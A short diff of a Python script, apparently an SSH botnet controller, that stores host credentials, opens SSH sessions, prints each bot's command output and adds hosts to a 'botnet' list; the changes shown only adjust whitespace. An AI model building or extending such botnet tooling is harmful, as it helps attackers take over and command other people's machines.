@@ -8,7 +8,7 @@ class Bot:
         self.password = password
         self.sessions = self.ssh()
 
-        
+
     # Secure shell into client
     def ssh(self):
         try:
@@ -34,9 +34,8 @@ class Bot:
             print('Output from ' + bot.host)
             print(attack)
 
+
 botnet = []
-
-
 def add_bot(host, user, password):
     # Add a new bot to your botnet
     new_bot = Bot(host, user, password)
